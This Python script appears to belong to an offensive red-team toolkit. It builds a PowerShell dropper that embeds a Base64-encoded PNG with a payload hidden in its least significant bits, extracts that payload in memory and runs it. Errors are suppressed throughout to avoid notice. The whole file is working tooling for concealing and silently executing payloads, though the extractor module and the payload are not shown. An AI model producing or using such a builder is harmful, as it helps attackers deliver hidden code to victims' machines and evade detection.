"""
Phase 2: Build Extractor Wrapper
Creates PowerShell script that:
1. Embeds Base64-encoded image with hidden payload
2. Calls the clean extractor.ps1 module with image bytes and metadata
3. Handles execution and cleanup
"""

import json
import argparse
import base64
from pathlib import Path
import os


class ExtractorBuilder:
    def __init__(self, verbose=True):
        self.verbose = verbose
        self.script_dir = Path(__file__).parent.parent
    
    def log(self, message, level="INFO"):
        if self.verbose:
            prefix = f"[{level}]" if level != "INFO" else "[BUILDER]"
            print(f"{prefix} {message}")
    
    def build(self, metadata_path, image_path, output_path):
        """
        Build PowerShell wrapper that:
        1. Contains Base64-encoded image with hidden payload
        2. Decodes image to bytes
        3. Calls extractor module to decrypt and execute payload
        
        Args:
            metadata_path: Path to metadata.json from steganography phase
            image_path: Path to PNG image with hidden data
            output_path: Path to save final PowerShell script
        
        Returns:
            str: Generated PowerShell script content
        """
        # Validate inputs
        if not os.path.exists(metadata_path):
            raise FileNotFoundError(f"Metadata not found: {metadata_path}")
        if not os.path.exists(image_path):
            raise FileNotFoundError(f"Image not found: {image_path}")
        
        self.log(f"Reading metadata from: {metadata_path}")
        with open(metadata_path, 'r') as f:
            metadata = json.load(f)
        
        payload_size = metadata['payload_size']
        self.log(f"Payload size: {payload_size} bytes")
        
        # Encode image as Base64
        self.log(f"Reading image: {image_path}")
        with open(image_path, 'rb') as f:
            image_bytes = f.read()
        image_b64 = base64.b64encode(image_bytes).decode('ascii')
        
        self.log(f"Image size: {len(image_bytes)} bytes")
        self.log(f"Base64 size: {len(image_b64)} bytes")
        
        # Load clean extractor module
        extractor_path = self.script_dir / 'builder' / 'extractor.ps1'
        if not extractor_path.exists():
            raise FileNotFoundError(f"Extractor not found: {extractor_path}")
        
        self.log(f"Loading extractor module: {extractor_path}")
        with open(extractor_path, 'r', encoding='utf-8') as f:
            extractor_code = f.read()
        
        # Generate wrapper script
        ps_script = self._generate_wrapper(
            extractor_code,
            image_b64,
            payload_size
        )
        
        # Save script
        self.log(f"Saving to: {output_path}")
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(ps_script)
        
        self.log("Wrapper script created successfully!", "SUCCESS")
        return ps_script
    
    def _generate_wrapper(self, extractor_code, image_b64, payload_size):
        """Generate wrapper script that embedds image and calls extractor"""
        
        # In PowerShell, we need to escape the Base64 data properly
        # Break it into chunks to avoid line length issues
        chunk_size = 1000
        b64_chunks = []
        for i in range(0, len(image_b64), chunk_size):
            b64_chunks.append(f'"{image_b64[i:i+chunk_size]}"')
        
        b64_assignment = " + \\\n    ".join(b64_chunks)
        
        ps_script = f'''# ============================================================================
# LSB STEGANOGRAPHY POLYGLOT PAYLOAD WRAPPER
# ============================================================================
# This script:
# 1. Contains Base64-encoded image with hidden payload
# 2. Decodes image to memory (no disk write)
# 3. Extracts payload from image LSB
# 4. Executes payload silently
# ============================================================================

$ErrorActionPreference = "SilentlyContinue"

# ===== EMBEDDED IMAGE DATA =====
$imageBase64 = {b64_assignment}

# ===== EXTRACTOR MODULE =====
{extractor_code}

# ===== EXECUTION =====

try {{
    # Decode Base64 to bytes
    $imageBytes = [System.Convert]::FromBase64String($imageBase64)
    
    # Call extractor with image bytes and metadata
    $extractedPayload = Extract-LSBData -ImageData $imageBytes -DataSize {payload_size}
    
    if ($null -ne $extractedPayload) {{
        # Execute payload
        Invoke-ExtractedPayload -PayloadData $extractedPayload
    }}
}}
catch {{
    # Silently fail (expected for red team operations)
    [void]0
}}
'''
        
        return ps_script


def main():
    parser = argparse.ArgumentParser(
        description='Build PowerShell wrapper with embedded image'
    )
    parser.add_argument('--metadata', required=True, help='Metadata JSON from steganography phase')
    parser.add_argument('--image', required=True, help='PNG image with hidden payload')
    parser.add_argument('--output', required=True, help='Output PowerShell script path')
    parser.add_argument('--quiet', action='store_true', help='Suppress output')
    
    args = parser.parse_args()
    
    builder = ExtractorBuilder(verbose=not args.quiet)
    
    try:
        builder.build(args.metadata, args.image, args.output)
        print(f"✓ Wrapper created: {args.output}")
    except Exception as e:
        print(f"✗ Error: {e}")
        return 1
    
    return 0


if __name__ == '__main__':
    exit(main())
